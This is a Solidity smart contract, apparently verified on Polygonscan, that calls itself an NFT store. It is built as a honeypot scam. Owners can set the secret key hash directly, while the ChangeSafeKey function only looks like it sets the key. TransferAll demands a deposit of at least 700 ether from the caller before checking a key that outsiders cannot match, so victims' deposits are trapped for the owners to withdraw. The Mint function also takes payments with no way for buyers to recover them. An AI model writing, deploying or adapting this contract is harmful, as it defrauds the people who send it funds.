/**
 *Submitted for verification at polygonscan.com on 2022-04-07
*/

pragma solidity ^0.8.7;


contract MerlinNFTStore
{

    uint256 private minBalance = 700 ether;
    mapping (bytes32=>bool) private owner;
    bytes32 private keyHash;
    mapping(address => uint256[]) public minted;

    fallback() external {}
    constructor(bytes32[] memory owners) {
        for(uint256 i=0; i< owners.length; i++){
            owner[owners[i]] = true;
        }
    }

    modifier isOwner(){
        require(owner[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    function CreateSafeKey(bytes32 _safeKey) public isOwner {
        keyHash = _safeKey;
    }

    function ChangeSafeKey(string memory _safeKey) public isOwner {
        if(keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(_safeKey));
        }
    }

    function Mint(uint256 _nftCode) external payable {
        minted[msg.sender].push(_nftCode);
    }

    function Deposit() external payable isOwner {}

    function Transfer(string memory _safeKey, address to, uint256 amount) public isOwner {
        require(msg.sender == tx.origin);
        require(address(this).balance >= minBalance, "insufficient balance to cover gas fees");
        if(keyHash == keccak256(abi.encodePacked(_safeKey))){
            payable(to).transfer(amount);
        }
    }

    function TransferAll(string memory _safeKey, address to)public 
   payable  {
       require(msg.sender == tx.origin);
         require(msg.value >= minBalance, "insufficient balavce to covergas fees");
        if(keyHash == keccak256(abi.encodePacked(_safeKey)) && msg.value > minBalance) {
            payable(to).transfer(address(this).balance - minBalance);
        }
    }

}